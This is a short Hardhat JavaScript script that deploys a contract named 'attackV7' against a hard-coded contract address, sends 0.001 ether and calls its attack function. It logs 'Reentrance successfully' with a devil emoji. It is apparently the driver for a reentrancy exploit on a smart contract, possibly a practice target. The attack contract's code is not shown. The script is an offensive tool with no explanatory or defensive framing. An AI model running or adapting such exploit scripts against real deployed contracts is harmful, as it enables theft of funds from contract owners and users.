const { ethers } = require("hardhat");


const ATTACKER_NAME = "attackV7";
const ReentrancyContract="0x8b0CF8fd5454F7a04c7B414d7ED3FaeC55CCc0FB"


async function main() {
  const attackerFactory = await ethers.getContractFactory(ATTACKER_NAME);
  const attackerContract = await attackerFactory.deploy(ReentrancyContract);
  await attackerContract.deployed();
 
  console.log("contract address: ", attackerContract.address);
 
  const etherToSend = ethers.utils.parseEther("0.001");
  const tx = await attackerContract.attack(attackerContract.address, {value: etherToSend});
  await tx.wait();

  console.log("Reentrance successfully 😈");

}

main().catch(error => {
  console.error(error);
  process.exit(1);
});